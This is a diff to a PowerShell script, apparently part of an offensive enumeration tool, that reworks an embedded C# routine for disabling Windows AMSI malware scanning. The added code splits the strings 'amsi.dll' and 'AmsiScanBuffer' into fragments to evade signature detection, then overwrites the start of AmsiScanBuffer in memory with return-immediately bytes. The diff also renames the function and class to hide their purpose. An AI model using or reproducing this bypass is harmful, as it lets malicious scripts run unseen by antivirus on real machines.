@@ -814,12 +814,12 @@ Function Get-AllFirewallRules($path) {
     }
 }
 
-Function Unhook-AMSI {
+Function Unhook {
     
 $win32 = @"
 using System.Runtime.InteropServices;
 using System;
-public class AMSI
+public class Unhook 
 {
     [DllImport("kernel32")]
     static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
@@ -833,33 +833,36 @@ public class AMSI
 
     public static void Disable()
     {
-        IntPtr TargetDLL = LoadLibrary("a" + "ms" + "i.dll");
-        if (TargetDLL == IntPtr.Zero)
+        var one = "i.dll";
+        var two = "a";
+        var three = "ms";
+        var dll = LoadLibrary(two + three + one);
+        if (dll == IntPtr.Zero)
         {
             return;
         }
-
-        IntPtr asbf = GetProcAddress(TargetDLL, "Am" + "siSc" + "anBuffer");
-        if (asbf == IntPtr.Zero)
+        var four = "nBuffer";
+        var five = "Ams";
+        var six = "iSca";
+        var proc = GetProcAddress(dll, five + six + four);
+        if (proc == IntPtr.Zero)
         {
             return;
         }
-
-        UIntPtr dwSize = (UIntPtr)5;
-        uint Zero = 0;
-        if (!VirtualProtect(asbf, dwSize, 0x40, out Zero))
+        var n = new byte[] { 0xb8,  0x00, 0x00, 0x00, 0x02, 0xc3 };
+        UIntPtr dwSize = (UIntPtr) n.Length;
+        uint old = 0;
+        if (!VirtualProtect(proc, dwSize, 0x40, out old))
         {
             return;
         }
-
-        Byte[] Patch = { 0x31, 0xff, 0x90 };
-        IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
-        Marshal.Copy(Patch, 0, unmanagedPointer, 3);
-        MoveMemory(asbf + 0x001b, unmanagedPointer, 3);
+        
+        Marshal.Copy(n, 0, proc, n.Length);
+        VirtualProtect(proc, dwSize, old, out old);
     }
 
 }
 "@
 Add-Type $win32
-$ptr = [AMSI]::Disable()
+$ptr = [Unhook]::Disable()
 }
